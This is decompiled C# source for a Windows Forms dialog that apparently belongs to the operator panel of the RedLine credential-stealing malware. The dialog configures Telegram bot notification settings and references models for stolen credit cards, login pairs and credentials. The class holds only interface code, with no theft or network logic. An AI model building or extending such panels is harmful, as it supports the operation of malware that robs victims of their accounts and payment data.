using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using MetroSet_UI.Controls;
using MetroSet_UI.Design;
using RedLine.MainPanel.Data.Extensions;
using RedLine.MainPanel.Data.UI;
using RedLine.SharedModels;

namespace RedLine.MainPanel.Views;

public class TelegramConfigurator : Form
{
	public TelegramChatSettings CurrentChatSettings;

	private object object_0;

	private object topHeader;

	private object mainTitle;

	private object closeBtn;

	private object object_1;

	private object object_2;

	private object logContextMenu;

	private object copyToolStripMenuItem;

	private object object_3;

	private object a;

	private object b;

	public TelegramConfigurator(TelegramChatSettings chatSettings)
	{
		InitializeComponent();
		this.AllowDraggBy((Control)topHeader);
		this.ApplyShadows();
		CurrentChatSettings = chatSettings;
		((TelegramBotSettingsControl)a).SetChatSettings(chatSettings);
	}

	private void closeBtn_Click(object sender, object e)
	{
		base.DialogResult = DialogResult.Cancel;
		Close();
	}

	private void topHeader_Paint(object sender, object e)
	{
		int num = ((Control)topHeader).Width - 1;
		int num2 = ((Control)topHeader).Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void TelegramConfigurator_Paint(object sender, object e)
	{
		int num = base.Width - 1;
		int num2 = base.Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void b_Click(object sender, object e)
	{
		TelegramChatSettings chatSettings = ((TelegramBotSettingsControl)a).GetChatSettings();
		if (string.IsNullOrWhiteSpace(chatSettings.MessageFormat))
		{
			MessageBox.Show(this, "Please, enter a message format");
			return;
		}
		CurrentChatSettings = chatSettings;
		base.DialogResult = DialogResult.OK;
		Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && object_0 != null)
		{
			((IDisposable)object_0).Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		this.object_0 = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RedLine.MainPanel.Views.TelegramConfigurator));
		this.topHeader = new System.Windows.Forms.Panel();
		this.mainTitle = new System.Windows.Forms.Label();
		this.closeBtn = new System.Windows.Forms.Label();
		this.logContextMenu = new System.Windows.Forms.ContextMenuStrip((System.ComponentModel.IContainer)this.object_0);
		this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.object_3 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_0);
		this.object_2 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_0);
		this.object_1 = new System.Windows.Forms.BindingSource((System.ComponentModel.IContainer)this.object_0);
		this.a = new RedLine.MainPanel.Data.UI.TelegramBotSettingsControl();
		this.b = (object)new MetroSetButton();
		((System.Windows.Forms.Control)this.topHeader).SuspendLayout();
		((System.Windows.Forms.Control)this.logContextMenu).SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.object_3).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.object_2).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.object_1).BeginInit();
		base.SuspendLayout();
		((System.Windows.Forms.Control)this.topHeader).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.mainTitle);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.closeBtn);
		((System.Windows.Forms.Control)this.topHeader).Dock = System.Windows.Forms.DockStyle.Top;
		((System.Windows.Forms.Control)this.topHeader).ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.Control)this.topHeader).Location = new System.Drawing.Point(0, 0);
		((System.Windows.Forms.Control)this.topHeader).Name = "topHeader";
		((System.Windows.Forms.Control)this.topHeader).Size = new System.Drawing.Size(871, 30);
		((System.Windows.Forms.Control)this.topHeader).TabIndex = 2;
		((System.Windows.Forms.Control)this.topHeader).Paint += new System.Windows.Forms.PaintEventHandler(topHeader_Paint);
		((System.Windows.Forms.Control)this.mainTitle).AutoSize = true;
		((System.Windows.Forms.Control)this.mainTitle).Font = new System.Drawing.Font("Segoe UI", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.mainTitle).ForeColor = System.Drawing.Color.Red;
		((System.Windows.Forms.Control)this.mainTitle).Location = new System.Drawing.Point(3, 4);
		((System.Windows.Forms.Control)this.mainTitle).Name = "mainTitle";
		((System.Windows.Forms.Control)this.mainTitle).Size = new System.Drawing.Size(158, 20);
		((System.Windows.Forms.Control)this.mainTitle).TabIndex = 2;
		((System.Windows.Forms.Control)this.mainTitle).Text = "RedLine | Configurator";
		((System.Windows.Forms.Control)this.closeBtn).AutoSize = true;
		((System.Windows.Forms.Control)this.closeBtn).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.closeBtn).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.closeBtn).Location = new System.Drawing.Point(847, 3);
		((System.Windows.Forms.Control)this.closeBtn).Name = "closeBtn";
		((System.Windows.Forms.Control)this.closeBtn).Size = new System.Drawing.Size(20, 21);
		((System.Windows.Forms.Control)this.closeBtn).TabIndex = 1;
		((System.Windows.Forms.Control)this.closeBtn).Text = "X";
		((System.Windows.Forms.Control)this.closeBtn).Click += new System.EventHandler(closeBtn_Click);
		((System.Windows.Forms.ToolStrip)this.logContextMenu).Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { (System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem });
		((System.Windows.Forms.Control)this.logContextMenu).Name = "logContextMenu";
		((System.Windows.Forms.Control)this.logContextMenu).Size = new System.Drawing.Size(103, 26);
		((System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem).Name = "copyToolStripMenuItem";
		((System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem).Size = new System.Drawing.Size(102, 22);
		((System.Windows.Forms.ToolStripItem)this.copyToolStripMenuItem).Text = "Copy";
		((System.Windows.Forms.BindingSource)this.object_3).DataSource = typeof(RedLine.SharedModels.CreditCard);
		((System.Windows.Forms.BindingSource)this.object_2).DataSource = typeof(RedLine.SharedModels.LoginPair);
		((System.Windows.Forms.BindingSource)this.object_1).DataSource = typeof(RedLine.SharedModels.Credentials);
		((System.Windows.Forms.Control)this.a).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.a).Location = new System.Drawing.Point(7, 36);
		((System.Windows.Forms.Control)this.a).Name = "telegramBotSettingsControl";
		((System.Windows.Forms.Control)this.a).Size = new System.Drawing.Size(857, 330);
		((System.Windows.Forms.Control)this.a).TabIndex = 3;
		((MetroSetButton)this.b).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.b).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
		((MetroSetButton)this.b).DisabledForeColor = System.Drawing.Color.Gray;
		((System.Windows.Forms.Control)this.b).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		((MetroSetButton)this.b).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.b).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
		((MetroSetButton)this.b).HoverTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.b).Location = new System.Drawing.Point(364, 372);
		((System.Windows.Forms.Control)this.b).Name = "saveBtn";
		((MetroSetButton)this.b).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.b).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetButton)this.b).NormalTextColor = System.Drawing.Color.White;
		((MetroSetButton)this.b).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.b).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((MetroSetButton)this.b).PressTextColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.b).Size = new System.Drawing.Size(102, 20);
		((MetroSetButton)this.b).Style = (Style)0;
		((MetroSetButton)this.b).StyleManager = null;
		((System.Windows.Forms.Control)this.b).TabIndex = 23;
		((System.Windows.Forms.Control)this.b).Text = "Save";
		((MetroSetButton)this.b).ThemeAuthor = "Narwin";
		((MetroSetButton)this.b).ThemeName = "MetroLite";
		((System.Windows.Forms.Control)this.b).Click += new System.EventHandler(b_Click);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		base.ClientSize = new System.Drawing.Size(871, 403);
		base.Controls.Add((System.Windows.Forms.Control)this.b);
		base.Controls.Add((System.Windows.Forms.Control)this.a);
		base.Controls.Add((System.Windows.Forms.Control)this.topHeader);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "TelegramConfigurator";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Meta | Configurator";
		base.Paint += new System.Windows.Forms.PaintEventHandler(TelegramConfigurator_Paint);
		((System.Windows.Forms.Control)this.topHeader).ResumeLayout(false);
		((System.Windows.Forms.Control)this.topHeader).PerformLayout();
		((System.Windows.Forms.Control)this.logContextMenu).ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.object_3).EndInit();
		((System.ComponentModel.ISupportInitialize)this.object_2).EndInit();
		((System.ComponentModel.ISupportInitialize)this.object_1).EndInit();
		base.ResumeLayout(false);
	}
}
